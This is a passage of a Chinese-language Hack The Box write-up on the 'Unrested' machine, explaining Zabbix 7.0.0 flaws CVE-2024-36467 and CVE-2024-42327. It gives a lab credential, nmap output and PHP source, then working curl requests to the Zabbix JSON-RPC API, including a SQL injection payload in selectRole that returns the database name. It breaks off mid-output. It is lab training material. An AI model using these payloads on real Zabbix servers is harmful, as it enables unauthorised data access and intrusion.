class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pth/" rel="tag">pth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reg/" rel="tag">reg</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpc/" rel="tag">rpc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/spn/" rel="tag">spn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sysctl/" rel="tag">sysctl</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/09/02/box-wp-Guardian/" title="【season-8】 htb Guardian wp" >
            <div class="recent-link-text">
              【season-8】 htb Guardian wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/29/wiz-2025-cloudsecuritychampionship-3/" title="【Wiz 2025】Breaking The Barriers" >
            <div class="recent-link-text">
              【Wiz 2025】Breaking The Barriers
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/11/wiz-2025-cloudsecuritychampionship-2/" title="【Wiz 2025】Contain Me If You Can" >
            <div class="recent-link-text">
              【Wiz 2025】Contain Me If You Can
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/14/htb-wp-Outbound/" title="【season-8】 htb Outbound wp" >
            <div class="recent-link-text">
              【season-8】 htb Outbound wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/11/Tracks-AD-Coder/" title="Tracks-AD-Coder" >
            <div class="recent-link-text">
              Tracks-AD-Coder
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div> 
</sidebar>


    </div>
    
    <div id="toc" class="widget-wrap">
      <button class="toc-toggle" onclick="toggleTOC()">
    <span class="toc-toggle-icon">
        <i class="fa fa-angle-down" aria-hidden="true" style="border-radius: 50%; padding: 5px; border: 1px solid var(--link);"></i>
    </span>
</button>
<div id="tocContainer" style="display: block;">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%99%A8%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">机器介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#default-passord"><span class="toc-number">1.2.</span> <span class="toc-text">default passord</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#to-User"><span class="toc-number">2.</span> <span class="toc-text">to User</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zabbix%E9%83%A8%E5%88%86%E2%80%94%E2%80%94%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">Zabbix部分——非预期解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zabbix%E9%83%A8%E5%88%86%E2%80%94%E2%80%94%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text">Zabbix部分——预期解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#to-Root"><span class="toc-number">5.</span> <span class="toc-text">to Root</span></a></li></ol>
</div>
<script>
    function toggleTOC() {
        const tocContainer = document.getElementById('tocContainer');
        tocContainer.style.display = tocContainer.style.display === 'none' ? 'block' : 'none';
        const toggleIcon = document.querySelector('.toc-toggle-icon i');
        toggleIcon.classList.toggle('fa-angle-down');
        toggleIcon.classList.toggle('fa-angle-up');
    }
</script>
<style>
    .toc-toggle {
        position: relative;
        display: inline-block;
        padding: 2% 2% 2%;
        border: none;
        border-radius: 100%;
        background-color: var(--link);
        cursor: pointer;
        transition: all 0.1s ease;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        /* position: absolute; */
        top: 0;
        right: 0;
        z-index: 10;
    }

    .toc-toggle:hover {
        background-color: var(--selection-bg);
        transform: scale(1.1);
    }

    .toc-toggle-icon {
        display: inline-block;
        vertical-align: middle;
    }

    .toc-toggle-icon i {
        display: inline-block;
        border-radius: 50%; /* Ensures the icon itself is a perfect circle */
    }

    /* #tocContainer {
        display: block;
        margin-top: 10px;
    } */
    #tocContainer {
    position: relative;
    padding-top: 10px; /* 留出按钮位置 */
}
</style>


    </div>
    
    <div id="content-body">
       


<article id="post-box-wp-Unrested" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cmgc87x6a0052y8kyd0uxb0xo">
        <img src="/wpimages/2024/Unrested/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        【CVE machines】 htb Unrested wp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-12-14T08:30:39.000Z" itemprop="datePublished">2024-12-14</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/CVE/">CVE</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            40k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="机器介绍"><a href="#机器介绍" class="headerlink" title="机器介绍"></a>机器介绍</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Unrested is a medium difficulty `Linux` machine hosting a version of `Zabbix`. </span><br><span class="line">Enumerating the version of `Zabbix` shows that it is vulnerable to both </span><br><span class="line">[CVE-2024-36467](https://nvd.nist.gov/vuln/detail/CVE-2024-36467) (missing access</span><br><span class="line">controls on the `user.update` function within the `CUser` class) and [CVE-2024-42327]</span><br><span class="line">(https://nvd.nist.gov/vuln/detail/CVE-2024-42327) (SQL injection in `user.get` </span><br><span class="line">function in `CUser` class) which is leveraged to gain user access on the target. </span><br><span class="line">Post-exploitation enumeration reveals that the system has a `sudo` misconfiguration</span><br><span class="line">allowing the `zabbix` user to execute `sudo /usr/bin/nmap`, an optional dependency </span><br><span class="line">in `Zabbix` servers that is leveraged to gain `root` access.</span><br></pre></td></tr></table></figure>

<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap -sS 10.10.11.50 -p- --min-rate=2000</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.50</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">10050/tcp open  zabbix-agent</span><br><span class="line">10051/tcp open  zabbix-trapper</span><br></pre></td></tr></table></figure>

<h3 id="default-passord"><a href="#default-passord" class="headerlink" title="default passord"></a>default passord</h3><p><code> Zabbix: matthew / 96qzn0h2e1k3</code></p>
<h2 id="to-User"><a href="#to-User" class="headerlink" title="to User"></a>to User</h2><p><em>实际上这个box一上来我手贱点了下简介，结果给我剧透了一脸</em></p>
<p>题目已经很明确的点出了这台要利用<code>CVE-2024-42327</code>，所以先看下对应的漏洞的产生过程</p>
<p>能看到在<code>7.0.1rc1</code>漏洞得到了修复，当前机器的版本是<code>7.0.0</code></p>
<p><img src="/wpimages/2024/Unrested/image-1.png" alt="alt text"></p>
<p>尝试搜索相关关键词，找到一个相关的zabbix版本日志</p>
<p><img src="/wpimages/2024/Unrested/image-2.png" alt="alt text"></p>
<p>继续在其中搜关键字，可以看到<code>DEV-3776</code>修复了<code>user.get</code>的注入漏洞</p>
<p><img src="/wpimages/2024/Unrested/image-3.png" alt="alt text"></p>
<p>在zabbix的repo中搜相关<code>commit</code>编号</p>
<p><img src="/wpimages/2024/Unrested/image-4.png" alt="alt text"></p>
<p>进来一眼就能看到有sql语句在下一版中被删了。</p>
<p><img src="/wpimages/2024/Unrested/image-5.png" alt="alt text"></p>
<p>往上走看到这是<code>addRelatedObjects</code>内的</p>
<p><img src="/wpimages/2024/Unrested/image-6.png" alt="alt text"></p>
<p>再看谁调用了<code>addRelatedObjects</code>，就走到了<code>get()</code></p>
<p><img src="/wpimages/2024/Unrested/image-7.png" alt="alt text"></p>
<p><img src="/wpimages/2024/Unrested/image-8.png" alt="alt text"></p>
<p>可以看下<code>get()</code>的逻辑</p>
<p>这里会检测我们是否为<code>admin</code>，很显然我们不是，而后进入其中，他会判断我们的发包中是<code>editable</code>是否为真，如果为假则可以查询当前用户所在的用户组内用户id信息，如果为真则只能查看当前用户的<code>userid</code>信息。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// permission check</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$userData</span>[<span class="string">&#x27;type&#x27;</span>] != USER_TYPE_SUPER_ADMIN) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$options</span>[<span class="string">&#x27;editable&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>][<span class="string">&#x27;users_groups&#x27;</span>] = <span class="string">&#x27;users_groups ug&#x27;</span>;</span><br><span class="line">		<span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][<span class="string">&#x27;uug&#x27;</span>] = <span class="string">&#x27;u.userid=ug.userid&#x27;</span>;</span><br><span class="line">		<span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="string">&#x27;ug.usrgrpid IN (&#x27;</span>.</span><br><span class="line">			<span class="string">&#x27; SELECT uug.usrgrpid&#x27;</span>.</span><br><span class="line">			<span class="string">&#x27; FROM users_groups uug&#x27;</span>.</span><br><span class="line">			<span class="string">&#x27; WHERE uug.userid=&#x27;</span>.<span class="built_in">self</span>::<span class="variable">$userData</span>[<span class="string">&#x27;userid&#x27;</span>].</span><br><span class="line">		<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="string">&#x27;u.userid=&#x27;</span>.<span class="built_in">self</span>::<span class="variable">$userData</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>细一点的来说这个内部的判断，就是首先将<code>users_groups</code>表添加到FROM子句中，别名为ug。<br>再添加一个子句条件，确保<code>u.userid（用户表中的用户ID）</code>等于<code>ug.userid（用户组表中的用户ID）</code>,最后通过一个子查询来限制<code>ug.usrgrpid（用户组ID）</code>是当前用户所在的用户组。</p>
<p>如果当前用户没有组的话需要启用<code>editable</code>，不然他就会走去查用户组内id和用户id是否匹配的那里.</p>
<p>所以这里我先尝试了一下当我们前用户应该是没有组别，<code>editable</code>关闭的时候会校验组，没通过所以返回空。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \</span><br><span class="line">--url &#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27; \</span><br><span class="line">--header &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">--data &#x27;&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot;: &#123;&quot;selectRole&quot;: [&quot;roleid&quot;],&quot;editable&quot;:0&#125;, &quot;auth&quot;: &quot;e1ced7a080ba08ae4e48a63dbe1f4ff6e8a92336ebbb53d338bcdb577449f2c1&quot;, &quot;id&quot;: 1&#125;&#x27; -s|jq </span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;result&quot;: [],</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Zabbix部分——非预期解"><a href="#Zabbix部分——非预期解" class="headerlink" title="Zabbix部分——非预期解"></a>Zabbix部分——非预期解</h2><p>将<code>editable</code>打开，让他验证时候查询自身，这样就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \</span><br><span class="line">--url &#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27; \</span><br><span class="line">--header &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">--data &#x27;&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot;: &#123;&quot;selectRole&quot;: [&quot;roleid&quot;],&quot;editable&quot;:1&#125;, &quot;auth&quot;: &quot;e1ced7a080ba08ae4e48a63dbe1f4ff6e8a92336ebbb53d338bcdb577449f2c1&quot;, &quot;id&quot;: 1&#125;&#x27; -s|jq</span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;result&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;userid&quot;: &quot;3&quot;,</span><br><span class="line">      &quot;username&quot;: &quot;matthew&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Matthew&quot;,</span><br><span class="line">      &quot;surname&quot;: &quot;Smith&quot;,</span><br><span class="line">      &quot;url&quot;: &quot;&quot;,</span><br><span class="line">      &quot;autologin&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;autologout&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;lang&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;refresh&quot;: &quot;30s&quot;,</span><br><span class="line">      &quot;theme&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;attempt_failed&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;attempt_ip&quot;: &quot;&quot;,</span><br><span class="line">      &quot;attempt_clock&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;rows_per_page&quot;: &quot;50&quot;,</span><br><span class="line">      &quot;timezone&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;roleid&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;userdirectoryid&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;ts_provisioned&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;role&quot;: &#123;</span><br><span class="line">        &quot;roleid&quot;: &quot;1&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参照官方文档</p>
<p><a target="_blank" rel="noopener" href="https://www.zabbix.com/documentation/6.0/jp/manual/api/reference/user/get">https://www.zabbix.com/documentation/6.0/jp/manual/api/reference/user/get</a></p>
<p>这里我先用<code>extend</code>拿一下这个注入点的几个字段名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \</span><br><span class="line">--url &#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27; \</span><br><span class="line">--header &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">--data &#x27;&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot;: &#123;&quot;selectRole&quot;: &quot;extend&quot;,&quot;editable&quot;:1&#125;, &quot;auth&quot;: &quot;e1ced7a080ba08ae4e48a63dbe1f4ff6e8a92336ebbb53d338bcdb577449f2c1&quot;, &quot;id&quot;: 1&#125;&#x27; -s|jq</span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;result&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;userid&quot;: &quot;3&quot;,</span><br><span class="line">      &quot;username&quot;: &quot;matthew&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Matthew&quot;,</span><br><span class="line">      &quot;surname&quot;: &quot;Smith&quot;,</span><br><span class="line">      &quot;url&quot;: &quot;&quot;,</span><br><span class="line">      &quot;autologin&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;autologout&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;lang&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;refresh&quot;: &quot;30s&quot;,</span><br><span class="line">      &quot;theme&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;attempt_failed&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;attempt_ip&quot;: &quot;&quot;,</span><br><span class="line">      &quot;attempt_clock&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;rows_per_page&quot;: &quot;50&quot;,</span><br><span class="line">      &quot;timezone&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;roleid&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;userdirectoryid&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;ts_provisioned&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;role&quot;: &#123;</span><br><span class="line">        &quot;roleid&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;User role&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;readonly&quot;: &quot;0&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相较于之前，这里多了<code>&quot;roleid&quot;: &quot;1&quot;,         &quot;name&quot;: &quot;User role&quot;,         &quot;type&quot;: &quot;1&quot;,         &quot;readonly&quot;: &quot;0&quot;</code>，加上字段让查询有结果，再尝试拼接注入</p>
<p>按照poc的注入字段改为list形式</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/compr00t/CVE-2024-42327">https://github.com/compr00t/CVE-2024-42327</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \</span><br><span class="line">--url <span class="string">&#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">--data <span class="string">&#x27;&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot;: &#123;&quot;selectRole&quot;: [&quot;type,(select database())&quot;],&quot;editable&quot;:1&#125;, &quot;auth&quot;: &quot;e1ced7a080ba08ae4e48a63dbe1f4ff6e8a92336ebbb53d338bcdb577449f2c1&quot;, &quot;id&quot;: 1&#125;&#x27;</span> -s|jq</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;result&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;userid&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">      <span class="string">&quot;username&quot;</span>: <span class="string">&quot;matthew&quot;</span>,</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Matthew&quot;</span>,</span><br><span class="line">      <span class="string">&quot;surname&quot;</span>: <span class="string">&quot;Smith&quot;</span>,</span><br><span class="line">      <span class="string">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;autologin&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;autologout&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lang&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">      <span class="string">&quot;refresh&quot;</span>: <span class="string">&quot;30s&quot;</span>,</span><br><span class="line">      <span class="string">&quot;theme&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">      <span class="string">&quot;attempt_failed&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;attempt_ip&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;attempt_clock&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;rows_per_page&quot;</span>: <span class="string">&quot;50&quot;</span>,</span><br><span class="line">      <span class="string">&quot;timezone&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">      <span class="string">&quot;roleid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;userdirectoryid&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;ts_provisioned&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;role&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;(select database())&quot;</span>: <span class="string">&quot;zabbix&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1</span><br><span 